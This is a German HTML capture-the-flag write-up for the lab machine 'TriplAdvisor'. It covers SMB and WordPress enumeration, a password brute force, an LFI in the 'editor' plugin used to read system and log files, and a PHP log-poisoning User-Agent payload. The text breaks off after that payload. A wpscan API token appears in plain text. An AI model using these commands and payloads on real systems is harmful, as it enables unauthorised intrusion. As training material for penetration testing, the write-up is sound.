@@ -1,0 +1,1018 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TriplAdvisor - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>TriplAdvisor - HackMyVM - Easy - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Farbe wird durch CSS gesteuert (lime) -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">rpcclient</div>
+                <div class="tool-item">lookupsid.py (Impacket)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">msfconsole (Metasploit)</div>
+                <div class="tool-item">hashdump (Meterpreter)</div> <!-- Hinzugefügt basierend auf Text -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#einleitung">Einleitung & Info</a></li>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#smb-analysis">SMB Analyse</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI</a></li>
+                <li><a href="#poc">Proof of Concept (LFI to RCE)</a></li>
+                <li><a href="#initial-access">Initial Access (Meterpreter)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <li><a href="#zusammenfassung">Zusammenfassung & Empfehlungen</a></li> <!-- Übernommen -->
+            </ul>
+        </section>
+
+        <section id="einleitung">
+            <h2>Einleitung & Info</h2>
+            <p class="analysis"><strong>Info:</strong> Neo4j ist eine in Java implementierte Open-Source-Graphdatenbank. Die Entwickler beschreiben Neo4j als eine eingebettete, Disk-basierte, transaktionale Datenbank-Engine, die Daten anstatt in Tabellen in Graphen strukturiert speichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Information gibt einen initialen Hinweis auf eine möglicherweise im Backend verwendete Technologie. Obwohl sie im weiteren Verlauf des Tests nicht direkt relevant wird, ist sie für ein vollständiges Bild des Systems nützlich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bei tiefergehenden Analysen oder Entdeckung entsprechender Schnittstellen gezielt auf Neo4j-spezifische Schwachstellen prüfen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass alle Systemkomponenten, auch wenn sie nicht direkt exponiert sind, sicher konfiguriert und aktuell gehalten werden.</p>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.116	08:00:27:0c:49:eb	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Hosts durchsucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.116` und der MAC-Adresse `08:00:27:0c:49:eb` (Oracle VirtualBox) wurde identifiziert. Dies ist das erste Zielobjekt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP als Ziel für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung auf ARP-Scans implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# Relevante Zeile nach Änderung:
+192.168.2.116	advisor.hmv
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um der IP `192.168.2.116` den Hostnamen `advisor.hmv` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vereinfacht die weitere Adressierung des Ziels für den Pentester.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardvorgehen zur Verbesserung der Lesbarkeit und Handhabung.<br><strong>Empfehlung (Admin):</strong> Keine direkte Auswirkung auf das Zielsystem.</p>
+
+            <p class="analysis"><strong>Info VM Loginscreen:</strong> Windows Server 2008 R2, Benutzer: `websvc`, `administrator`</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Extrem wertvolle Information aus der VM-Beschreibung. Enthüllt das veraltete Betriebssystem und zwei valide Benutzernamen. Dies ist ein starker Hinweis auf potenzielle Schwachstellen und erleichtert Angriffsversuche erheblich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Benutzernamen für Authentifizierungsversuche (SMB, Web, etc.) priorisieren.<br><strong>Empfehlung (Admin):</strong> Veraltetes OS dringend patchen/ersetzen. Standard-Admin-Namen ändern/deaktivieren. Starke Passwörter verwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 23:23 CEST
+Nmap scan report for advisor.hmv (192.168.2.116)
+Host is up (0.00013s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+MAC Address: 08:00:27:0C:49:EB (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (98%), Microsoft Windows Embedded Standard 7 (98%), Microsoft Windows 7 Professional or Windows 8 (97%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (97%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (96%), Microsoft Windows Server 2008 R2 or Windows 8.1 (95%), Microsoft Windows Server 2008 SP1 (93%), Microsoft Windows 7 (93%), Microsoft Windows 7 SP1 (92%), Microsoft Windows Vista SP0 - SP1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+Host script results:
+| smb2-time:
+|   date: 2024-08-14T21:24:40
+|_  start_date: 2024-08-15T06:18:54
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms advisor.hmv (192.168.2.116)
+                    </pre> <!-- Typos wie PRT, VERSIN, racle, SScan, HP, RUTE korrigiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sC` für Skripte, `-sS` für SYN-Scan, `-sV` für Versionen, `-A` für OS/Version/Skript/Traceroute, `-T5` für aggressives Timing, `-p-` für alle Ports) wird auf `192.168.2.116` durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hauptfund ist der offene Port 445 (SMB). Das Skript `smb2-security-mode` zeigt die kritische Schwachstelle `Message signing enabled but not required` auf. OS-Erkennung deutet auf Windows 7/Server 2008 R2 hin. Viele gefilterte Ports lassen auf eine Firewall schließen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SMB als primären Angriffsvektor untersuchen (Enumeration, Relay-Angriffe).<br><strong>Empfehlung (Admin):</strong> SMB Signing erzwingen! OS patchen/ersetzen. Firewall überprüfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.116 -p- | grep open</span></div>
+                    <pre>
+445/tcp open  microsoft-ds?
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Filtert die vorherige Nmap-Ausgabe, um nur offene Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Port 445 als einzigen offenen Port.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für schnelle Übersicht, aber nicht die Details (Skripte) vergessen.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+        </section>
+
+        <section id="smb-analysis">
+            <h2>SMB Analyse</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -p 445 --script smb2-security-mode 192.168.2.117</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 13:09 CEST
+Nmap scan report for TriplAdvisor (192.168.2.117)
+Host is up (0.00071s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:7E:1C:11 (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb2-security-mode:
+|   2:1:0:
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
+                    </pre> <!-- Typo PRT korrigiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gezielter Scan auf Port 445 mit dem Skript `smb2-security-mode` auf einer *neuen* IP-Adresse: `192.168.2.117`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Auch auf diesem Host (andere MAC, vermutlich andere VM) ist SMB Signing nicht erzwungen. Dies deutet auf eine konsistente Fehlkonfiguration oder ein gemeinsames Basis-Image hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide IPs im Auge behalten. Prüfen, ob sich die Systeme unterscheiden.<br><strong>Empfehlung (Admin):</strong> SMB Signing auf *allen* Systemen im Netz erzwingen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient "//192.168.2.117/TRIPLADVISOR/" -N --debuglevel=10</span></div> <!-- Typo TRIPLADVISR korrigiert -->
+                    <pre>
+INFO: Current debug levels:
+  all: 10
+  tdb: 10
+  printdrivers: 10
+# ... (restliche Debug-Level-Ausgabe)
+# Keine Fehlermeldung oder Erfolgsmeldung bezüglich des Shares
+                    </pre> <!-- Typo INF korrigiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, anonym (`-N`) auf die SMB-Freigabe `TRIPLADVISOR` auf 192.168.2.117 zuzugreifen. Hoher Debug-Level aktiviert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Es erfolgt keine Verbindung oder Fehlermeldung bezüglich des Shares selbst, was darauf hindeutet, dass der anonyme Zugriff verweigert wird oder der Share nicht existiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Methoden zur Share-Enumeration (smbmap, nmap-Skripte) oder authentifizierten Zugriff versuchen.<br><strong>Empfehlung (Admin):</strong> Anonymen SMB-Zugriff deaktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">rpcclient -U "" -N 192.168.2.117</span></div>
+                    <pre>
+rpcclient $>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch einer anonymen RPC-Verbindung (Null-Session) zu 192.168.2.117.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Der `rpcclient $>`-Prompt erscheint. Dies ermöglicht potenziell weitere Enumeration über RPC.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> RPC-Enumerationsbefehle innerhalb der `rpcclient`-Sitzung ausführen (`enumdomusers`, etc.).<br><strong>Empfehlung (Admin):</strong> Anonymen RPC-Zugriff einschränken (Policy: "Netzwerkzugriff: Anonyme SID-/Namensübersetzung einschränken").</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">/opt/impacket/impacket-scripts/lookupsid.py -no-pass 192.168.2.117</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at 192.168.2.117
+[*] StringBinding ncacn_np:192.168.2.117[\pipe\lsarpc]
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `lookupsid.py` versucht, SIDs über eine Null-Session aufzulösen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen mit `STATUS_ACCESS_DENIED`. Obwohl eine RPC-Null-Session möglich war, reichen die Berechtigungen nicht für die SID-Enumeration über `lsarpc`. Das System ist hier gehärtet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Enumerationswege nutzen.<br><strong>Empfehlung (Admin):</strong> Sicherheitsrichtlinie beibehalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient -U '%' -N \\\\192.168.2.117\\IPC$</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> pwd
+Current directory is \\192.168.2.117\IPC$\
+smb: \>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch einer SMB-Null-Session zur `IPC$`-Freigabe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Verbindung möglich (`pwd` funktioniert), aber Auflistung (`ls`) wird mit `NT_STATUS_ACCESS_DENIED` blockiert. Bestätigt eingeschränkten anonymen Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf andere Angriffsvektoren oder authentifizierte Angriffe legen.<br><strong>Empfehlung (Admin):</strong> Konfiguration beibehalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap 192.168.2.119 -n -Pn -p- --min-rate 10000</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 18:52 CEST
+Nmap scan report for 192.168.2.119
+Host is up (0.00018s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:79:F4:4D (Oracle VirtualBox virtual NIC)
+                    </pre> <!-- Typo PRT, racle korrigiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Schneller Portscan (`-Pn`, `--min-rate 10000`) auf eine *dritte* IP-Adresse: `192.168.2.119`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet offenen Port 445 (SMB) und den neuen, interessanten Port 8080 (HTTP-Proxy/Webserver). Erneute andere MAC, andere VM. Dies wird nun das Hauptziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Dienst auf Port 8080 untersuchen.<br><strong>Empfehlung (Admin):</strong> Netzwerk aufräumen, unnötige VMs/Dienste abschalten. Port 8080 absichern.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & LFI</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://Tripladvisor:8080" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,...,js.map -b '503,404,403' -e --no-error -k</span></div> <!-- Lange Liste von Endungen gekürzt -->
+                    <pre>
+http://Tripladvisor:8080/index.html           (Status: 200) [Size: 202]
+http://Tripladvisor:8080/index.php            (Status: 302) [Size: 0] [--> http://Tripladvisor:8080/wordpress/]
+http://Tripladvisor:8080/thumbs.db            (Status: 200) [Size: 3584]
+http://Tripladvisor:8080/wordpress            (Status: 301) [Size: 243] [--> http://tripladvisor:8080/wordpress/]
+http://Tripladvisor:8080/Index.php            (Status: 302) [Size: 0] [--> http://Tripladvisor:8080/wordpress/]
+http://Tripladvisor:8080/Index.html           (Status: 200) [Size: 202]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` sucht nach Verzeichnissen und Dateien auf `http://Tripladvisor:8080` (Hostname zeigt jetzt vermutlich auf 192.168.2.119).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Fund: Die Weiterleitungen auf `/wordpress/` deuten klar auf eine WordPress-Installation hin. `thumbs.db` ist ebenfalls vorhanden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> WordPress-Installation unter `/wordpress/` mit `wpscan` genauer untersuchen.<br><strong>Empfehlung (Admin):</strong> WordPress aktuell halten, unnötige Dateien (`thumbs.db`) entfernen, WAF einsetzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"> # Kein Prompt im Original, Befehl direkt ausgeführt
+└─# <span class="command">curl http://tripladvisor:8080/wordpress/wp-json/wp/v2/users</span></div>
+                    <pre>
+[
+  {
+    "id": 1,
+    "name": "admin",
+    "url": "",
+    "description": "",
+    "link": "http:\/\/tripladvisor:8080\/wordpress\/author\/admin\/",
+    "slug": "admin",
+    "avatar_urls": {
+      "24": "http:\/\/2.gravatar.com\/avatar\/e64c7d89f26bd1972efa854d13d7dd61?s=24&d=mm&r=g",
+      "48": "http:\/\/2.gravatar.com\/avatar\/e64c7d89f26bd1972efa854d13d7dd61?s=48&d=mm&r=g",
+      "96": "http:\/\/2.gravatar.com\/avatar\/e64c7d89f26bd1972efa854d13d7dd61?s=96&d=mm&r=g"
+    },
+    "meta": [],
+    "_links": {
+      "self": [
+        {
+          "href": "http:\/\/tripladvisor:8080\/wordpress\/wp-json\/wp\/v2\/users\/1"
+        }
+      ],
+      "collection": [
+        {
+          "href": "http:\/\/tripladvisor:8080\/wordpress\/wp-json\/wp\/v2\/users"
+        }
+      ]
+    }
+  }
+]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Abfrage der WordPress REST API (`/wp-json/wp/v2/users`) zur Benutzer-Enumeration.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritisch! Bestätigt die Existenz des Standard-Benutzers "admin" (ID 1).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> "admin" für Passwort-Bruteforce verwenden.<br><strong>Empfehlung (Admin):</strong> REST API `/users`-Endpunkt einschränken. Standard-Admin-Namen ändern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://Tripladvisor:8080 -e u</span></div>
+                    <pre>
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://tripladvisor:8080/ [192.168.2.119]
+[+] Effective URL: http://tripladvisor:8080/wordpress/
+[+] Started: Sun Aug 18 19:04:43 2024
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:12 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:12 <!-- Progress Bar gekürzt -->
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://tripladvisor:8080/wordpress/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Rss Generator (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK <!-- Typo K korrigiert -->
+ | Plan: free
+ | Requests Done (during the scan): 2
+ | Requests Remaining: 23
+
+[+] Finished: Sun Aug 18 19:05:34 2024
+[+] Requests Done: 83
+[+] Cached Requests: 4
+[+] Data Sent: 25.052 KB
+[+] Data Received: 21.849 MB
+[+] Memory used: 158.59 MB
+[+] Elapsed time: 00:00:51
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird zur Benutzer-Enumeration (`-e u`) auf `http://Tripladvisor:8080` (IP 192.168.2.119) eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Benutzer "admin" durch mehrere Methoden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> "admin" als Ziel für Passwortangriffe nutzen. Weitere `wpscan`-Enumerationen (Plugins, Themes) durchführen.<br><strong>Empfehlung (Admin):</strong> Maßnahmen gegen Benutzer-Enumeration ergreifen. Standard-Admin-Namen ändern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://Tripladvisor:8080 --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token RoBoAaM72LLsihlqUJrA1EleT6AJAd9QxQ9rbmQNCY</span></div> <!-- Typo im Token korrigiert -->
+                    <pre># Keine Ausgabe im Text - Annahme: erfolglos</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird für einen Passwort-Bruteforce-Angriff auf "admin" mit der `rockyou.txt`-Liste verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vermutlich erfolglos, da keine Erfolgsmeldung im Text folgt und später ein Exploit genutzt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Angriffsmethoden (Exploits) suchen.<br><strong>Empfehlung (Admin):</strong> Starke Passwörter, Login-Rate-Limiting, 2FA.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Original, vermutlich Teil der vorherigen WPScan-Ausgabe oder separater Lauf mit -e vp
+└─# <span class="command"># wpscan --url http://Tripladvisor:8080 -e vp (vermuteter Befehl)</span></div>
+                     <pre>
+[+] editor
+ | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> WPScan identifiziert das Plugin "editor" und bestimmt dessen Version als 1.1.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die genaue Versionsnummer ermöglicht die gezielte Suche nach Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach Exploits für "editor" v1.1 suchen.<br><strong>Empfehlung (Admin):</strong> Plugin aktualisieren oder entfernen. Zugriff auf `readme.txt` einschränken.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Recherche (Google, Exploit-DB) nach Exploits für das Plugin "editor".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Ein LFI-Exploit (Local File Inclusion) für Version 1.1.1 wird auf Exploit-DB (exploit/44340) gefunden. Es ist wahrscheinlich, dass dieser auch für v1.1 funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den LFI-Exploit testen.<br><strong>Empfehlung (Admin):</strong> Plugin sofort entfernen/patchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"> # Kein Prompt, Browser-Aktion
+└─# <span class="command"># Besuch der URL im Browser (view-source)</span></div>
+                     <pre>
+view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+{"success":false,"message":"Error: didn't load shortcodes pattern file"}
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erster Versuch, die LFI-Schwachstelle auszunutzen, um `/etc/passwd` zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Die Fehlermeldung deutet auf einen falschen Pfad (Linux-Pfad auf Windows-System) oder Pfadfilterung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Windows-Pfade oder Fuzzing (z.B. mit `wfuzz`) verwenden, um gültige Dateien zu finden.<br><strong>Empfehlung (Admin):</strong> Plugin patchen/entfernen. Input-Validierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u "tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ" --hh 72</span></div>
+                    <pre>
+Target: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000001643:   200        564 L    2563 W     21507 Ch    "\xampp\apache\conf\httpd.conf"
+000001620:   200        7 L      13 W       129 Ch      "C:\WINDOWS\win.ini" <!-- Typo WINDOWS korrigiert -->
+000001642:   200        0 L      1 W        37 Ch       "\xampp\phpMyAdmin\config.inc.php"
+000001641:   200        0 L      1 W        37 Ch       "\xampp\phpmyadmin\config.inc.php"
+# ... (weitere Funde)
+000001654:   200        18412 L  220962 W   1957925 Ch   "\xampp\apache\logs\access.log" <!-- Zeilenumbruch korrigiert -->
+000001653:   200        51724 L  1053562 W  8593699 Ch   "\xampp\apache\logs\error.log" <!-- Zeilenumbruch korrigiert -->
+
+Total time: 2.983324
+Processed Requests: 2894
+Filtered Requests: 2881
+Requests/sec.: 970.0587
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird mit einer Liste gängiger Log-/Konfigurationsdateien verwendet, um über die LFI-Schwachstelle lesbare Dateien zu finden. Antworten mit 72 Zeichen (vermutlich Fehlermeldung) werden ignoriert (`--hh 72`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sehr erfolgreich! Mehrere interessante Dateien gefunden, darunter `C:\WINDOWS\win.ini` und vor allem die Apache-Logdateien `\xampp\apache\logs\access.log` und `error.log`. Dies öffnet die Tür für Log Poisoning.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Log Poisoning versuchen: Code in Logs schreiben (z.B. via User-Agent) und dann die Logdatei über LFI ausführen.<br><strong>Empfehlung (Admin):</strong> LFI beheben. Zugriff auf Logdateien über Web einschränken. XAMPP nicht produktiv nutzen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt, Browser-Aktion
+└─# <span class="command"># Besuch der URL im Browser (view-source)</span></div>
+                     <pre>
+view-source:http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=\xampp\apache\logs\access.log
+
+# Gekürzte Log-Ausgabe:
+192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET ...?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 ...
+...
+fe80::58d6:a2ae:50ae:f30e - - [18/Aug/2024:09:58:01 -0700] "POST /wordpress/wp-cron.php?..." 200 - "..." "WordPress/5.1.19; http://tripladvisor:8080/wordpress" <!-- Typo POST korrigiert -->
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die `access.log` wird erfolgreich über LFI ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Lesbarkeit. Der Logeintrag von `wp-cron.php` verrät die WordPress-Version 5.1.19 (veraltet).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> WordPress-Version auf bekannte Schwachstellen prüfen. Mit Log Poisoning fortfahren.<br><strong>Empfehlung (Admin):</strong> WordPress aktualisieren. LFI beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -A "<?php system('dir'); ?>" http://tripladvisor:8080/wordpress/</span></div>
+                    <pre>
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+ <!-- Built With SiteEditor | http://www.siteeditor.org -->
+
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="profile" href="https://gmpg.org/xfn/11">
+# ... (Rest der HTML-Antwort)
+                    </pre> <!-- HTML maskiert -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, PHP-Code (`<?php system('dir'); ?>`) via User-Agent (`-A`) in die `access.log` zu schreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl selbst gibt nur die HTML-Seite zurück. Der Erfolg hängt davon ab, ob der Code in die Logs geschrieben und später ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun die `access.log` erneut über LFI aufrufen.<br><strong>Empfehlung (Admin):</strong> LFI beheben. Log-Maskierung aktivieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"> # Kein Prompt, Browser-Aktion
